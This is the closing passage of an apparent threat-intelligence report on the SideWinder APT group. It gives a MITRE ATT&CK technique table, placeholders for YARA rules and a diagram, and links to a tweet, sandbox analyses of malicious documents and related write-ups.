| ------------- |:-------------:|
|||
<h6> The IOC can be exported in <a href="">JSON</a></h6>

<h2> References MITRE ATT&CK Matrix <a name="Ref-MITRE-ATTACK"></a></h2>

|Enterprise tactics|Technics used|Ref URL|
| :---------------: |:-------------| :------------- |
|Execution|Execution through Module Load<br>Exploitation for Client Execution|https://attack.mitre.org/techniques/T1129/<br>https://attack.mitre.org/techniques/T1203/|
|Persistence|Registry Run Keys / Startup Folder|https://attack.mitre.org/techniques/T1060/|
|Discovery|Query Registry|https://attack.mitre.org/techniques/T1012/|

<h6> This can be exported as JSON format <a href="https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Indian/APT/SideWinder/25-12-19/JSON/MITRE_ref.json">Export in JSON</a></h6>
<h2>Yara Rules<a name="Yara"></a></h2>
<h6> A list of YARA Rule is available <a href="">here</a></h6>
<h2>Knowledge Graph<a name="Knowledge"></a></h2><a name="Know"></a>
<h6>The following diagram shows the relationships of the techniques used by the groups and their corresponding malware:</h6>
<p align="center">
  <img src="">
</p>
<h2>Links <a name="Links"></a></h2>
<h6> Original tweet: </h6><a name="tweet"></a>

* [https://twitter.com/RedDrip7/status/1206898954383740929](https://twitter.com/RedDrip7/status/1206898954383740929) 

<h6> Links Anyrun: <a name="Links-Anyrun"></a></h6>

* [Policy on Embedded Systems.doc](https://app.any.run/tasks/1fac2867-012c-4298-af36-a4810d9b72db)
* [adsfa.rtf](https://app.any.run/tasks/72ec8c7c-5542-48fe-8400-ba840de9c0bd)
* [out.rtf](https://app.any.run/tasks/34c8345c-b661-4ca5-ba15-58dcc4e6d968)

<h6> Resources : </h6><a name="Ressources"></a>

* [The SideWinder campaign continue](https://github.com/StrangerealIntel/CyberThreatIntel/blob/master/Indian/APT/SideWinder/11-10-2019/Analysis.md)
* [CVE-2017-11882](https://github.com/embedi/CVE-2017-11882)dz